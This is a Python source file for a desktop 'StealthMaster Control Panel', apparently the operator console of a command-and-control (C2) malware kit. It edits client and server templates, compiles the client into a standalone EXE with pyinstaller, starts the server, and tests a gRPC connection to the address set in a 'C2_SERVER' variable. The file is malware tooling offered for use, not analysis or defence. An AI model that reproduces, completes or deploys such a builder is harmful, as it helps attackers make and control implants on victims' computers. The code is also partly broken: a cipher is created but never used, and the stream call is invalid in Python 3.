import os
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import subprocess
from cryptography.fernet import Fernet
import grpc
import command_pb2
import command_pb2_grpc

class GUIApp:
    def __init__(self, root):
        self.root = root
        self.root.title("StealthMaster Control Panel")
        self.root.geometry("900x700")
        self.root.configure(bg="#1e1e1e")  # تم تیره

        # استایل‌ها
        self.style = ttk.Style()
        self.style.configure("TNotebook", background="#1e1e1e", foreground="#ffffff")
        self.style.configure("TFrame", background="#1e1e1e")
        self.style.configure("TButton", background="#333333", foreground="#ffffff")
        self.style.map("TButton", background=[("active", "#555555")])

        # تب‌ها
        self.tabs = ttk.Notebook(root)
        self.client_tab = ttk.Frame(self.tabs)
        self.server_tab = ttk.Frame(self.tabs)
        self.status_tab = ttk.Frame(self.tabs)
        self.tabs.add(self.client_tab, text="Client Editor")
        self.tabs.add(self.server_tab, text="Server Editor")
        self.tabs.add(self.status_tab, text="Status")
        self.tabs.pack(expand=1, fill="both", padx=10, pady=10)

        # کلید رمزنگاری
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

        # تب کلاینت
        self.client_frame = tk.Frame(self.client_tab, bg="#1e1e1e")
        self.client_frame.pack(fill="both", expand=True, padx=10, pady=10)

        tk.Label(self.client_frame, text="Client Code Editor", font=("Arial", 14, "bold"), fg="#ffffff", bg="#1e1e1e").pack(anchor="w")
        self.client_text = scrolledtext.ScrolledText(self.client_frame, wrap=tk.WORD, width=100, height=30, bg="#2d2d2d", fg="#ffffff", insertbackground="white", font=("Consolas", 10))
        self.client_text.pack(pady=10)
        with open("client_template.py", "r") as f:
            self.client_text.insert(tk.END, f.read())

        self.client_buttons = tk.Frame(self.client_frame, bg="#1e1e1e")
        self.client_buttons.pack(fill="x")
        ttk.Button(self.client_buttons, text="Save Changes", command=self.save_client).pack(side="left", padx=5, pady=5)
        ttk.Button(self.client_buttons, text="Build EXE", command=self.build_client).pack(side="left", padx=5, pady=5)

        # تب سرور
        self.server_frame = tk.Frame(self.server_tab, bg="#1e1e1e")
        self.server_frame.pack(fill="both", expand=True, padx=10, pady=10)

        tk.Label(self.server_frame, text="Server Code Editor", font=("Arial", 14, "bold"), fg="#ffffff", bg="#1e1e1e").pack(anchor="w")
        self.server_text = scrolledtext.ScrolledText(self.server_frame, wrap=tk.WORD, width=100, height=30, bg="#2d2d2d", fg="#ffffff", insertbackground="white", font=("Consolas", 10))
        self.server_text.pack(pady=10)
        with open("server_template.py", "r") as f:
            self.server_text.insert(tk.END, f.read())

        self.server_buttons = tk.Frame(self.server_frame, bg="#1e1e1e")
        self.server_buttons.pack(fill="x")
        ttk.Button(self.server_buttons, text="Save Changes", command=self.save_server).pack(side="left", padx=5, pady=5)
        ttk.Button(self.server_buttons, text="Run Server", command=self.run_server).pack(side="left", padx=5, pady=5)
        ttk.Button(self.server_buttons, text="Test Connection", command=self.test_connection).pack(side="left", padx=5, pady=5)

        # تب وضعیت
        self.status_frame = tk.Frame(self.status_tab, bg="#1e1e1e")
        self.status_frame.pack(fill="both", expand=True, padx=10, pady=10)

        tk.Label(self.status_frame, text="System Status", font=("Arial", 14, "bold"), fg="#ffffff", bg="#1e1e1e").pack(anchor="w")
        self.status_text = scrolledtext.ScrolledText(self.status_frame, wrap=tk.WORD, width=100, height=30, bg="#2d2d2d", fg="#00ff00", font=("Consolas", 10))
        self.status_text.pack(pady=10)
        self.status_text.insert(tk.END, "System initialized.\n")
        self.status_text.config(state="disabled")

    def log_status(self, message):
        self.status_text.config(state="normal")
        self.status_text.insert(tk.END, message + "\n")
        self.status_text.config(state="disabled")
        self.status_text.see(tk.END)

    def save_client(self):
        with open("client_template.py", "w") as f:
            f.write(self.client_text.get("1.0", tk.END))
        self.log_status("Client code saved successfully.")
        messagebox.showinfo("Success", "Client code saved!")

    def save_server(self):
        with open("server_template.py", "w") as f:
            f.write(self.server_text.get("1.0", tk.END))
        self.log_status("Server code saved successfully.")
        messagebox.showinfo("Success", "Server code saved!")

    def build_client(self):
        try:
            subprocess.run(["pyinstaller", "--onefile", "client_template.py"], check=True)
            self.log_status("Client EXE built successfully in dist folder.")
            messagebox.showinfo("Success", "Client EXE built in dist folder!")
        except Exception as e:
            self.log_status(f"Build failed: {e}")
            messagebox.showerror("Error", f"Build failed: {e}")

    def run_server(self):
        try:
            subprocess.Popen(["python", "server_template.py"])
            self.log_status("Server started successfully.")
            messagebox.showinfo("Success", "Server started!")
        except Exception as e:
            self.log_status(f"Server run failed: {e}")
            messagebox.showerror("Error", f"Server run failed: {e}")

    def test_connection(self):
        try:
            with open("client_template.py", "r") as f:
                for line in f:
                    if "C2_SERVER" in line:
                        server_address = line.split("=")[1].strip().strip('"')
                        break
            with grpc.secure_channel(server_address, grpc.ssl_channel_credentials()) as channel:
                stub = command_pb2_grpc.CommandServiceStub(channel)
                request = command_pb2.CommandRequest(client_id="test_client", report="Connection test")
                response = stub.CommandStream(iter([request])).next()
                self.log_status(f"Connection successful: {response.command}")
                messagebox.showinfo("Success", "Connection to server successful!")
        except Exception as e:
            self.log_status(f"Connection test failed: {e}")
            messagebox.showerror("Error", f"Connection test failed: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = GUIApp(root)
    root.mainloop()